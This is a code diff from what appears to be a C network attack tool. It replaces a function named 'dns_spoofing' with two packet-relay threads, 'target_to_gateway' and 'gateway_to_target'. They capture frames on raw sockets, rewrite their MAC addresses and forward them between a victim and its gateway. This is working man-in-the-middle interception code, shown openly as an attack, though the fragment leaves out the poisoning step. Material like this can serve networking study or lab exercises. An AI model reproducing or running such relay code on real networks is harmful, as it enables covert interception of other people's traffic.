@@ -36,8 +36,37 @@ void modify_pac(uint8_t *ip_pac, uint8_t* sha, uint8_t* tha){
         eth_hdr->ether_dhost[i] = *(tha+i);
     }
 }
-void* dns_spoofing(void* args){
-    fprintf(stderr, "\nSTART DNS ATTACK\n");
+void* target_to_gateway(void* args){
+    int sock_ip = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
+    if(sock_ip < 0){
+        fprintf(stderr, "Error in creating IP socket\n");
+        exit(0);
+    }
+    attacking_args_t *argument = (attacking_args_t*) args;
+    uint8_t* ip_pac = malloc(IP_PACKET_LEN);
+
+    memset(ip_pac, 0 , IP_PACKET_LEN);
+    struct ether_header *eth_hdr = (struct ether_header*) ip_pac;
+    struct iphdr *ip_hdr = (struct iphdr*) (ip_pac + sizeof(struct ether_header));
+    int byte_recv;
+    int i;
+    while(1){
+        byte_recv = recvfrom(sock_ip, ip_pac, IP_PACKET_LEN, 0, NULL, NULL);
+        if(byte_recv>0){
+            if(compare_mac(eth_hdr->ether_dhost, argument->my_mac) && compare_ip(ip_hdr->saddr, argument->target_ip) && !compare_ip(ip_hdr->daddr, argument->my_ip)){
+                printf("_________________________________\n");
+                //pac_status(ip_pac);
+                modify_pac(ip_pac, argument->my_mac, argument->gateway_mac);
+                if(!sendto(sock_ip, ip_pac, byte_recv, 0, (struct sockaddr*) &(argument->socket_address), argument->addr_len))
+                    fprintf(stderr, "Error in forwading\n");
+                else
+                    fprintf(stderr, "Target -> Gateway\n");
+                
+            }
+        }
+    }
+}
+void* gateway_to_target(void* args){
     int sock_ip = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
     if(sock_ip < 0){
         fprintf(stderr, "Error in creating IP socket\n");
@@ -56,20 +85,16 @@ void* dns_spoofing(void* args){
     while(1){
         byte_recv = recvfrom(sock_ip, ip_pac, IP_PACKET_LEN, 0, NULL, NULL);
         if(byte_recv>0){
-            if(compare_mac(eth_hdr->ether_dhost, argument->my_mac) && compare_ip(ip_hdr->saddr, argument->target_ip) && !compare_ip(ip_hdr->daddr, argument->my_ip)){
+            if(compare_mac(eth_hdr->ether_dhost, argument->my_mac) && compare_ip(ip_hdr->daddr, argument->target_ip)){
                 printf("_________________________________\n");
-                for(i =0; i<byte_recv;i++)
-                    printf("%.2x ", *(ip_pac+i));
-                    printf("\n");
-                pac_status(ip_pac);
-                modify_pac(ip_pac, argument->my_mac, argument->gateway_mac);
+                //pac_status(ip_pac);
+                modify_pac(ip_pac, argument->my_mac, argument->target_mac);
                 if(!sendto(sock_ip, ip_pac, byte_recv, 0, (struct sockaddr*) &(argument->socket_address), argument->addr_len))
                     fprintf(stderr, "Error in forwading\n");
                 else
-                    fprintf(stderr, "Forwaded packet\n");
+                    fprintf(stderr, "Gateway -> Target\n");
                 
             }
         }
     }
-    
 }
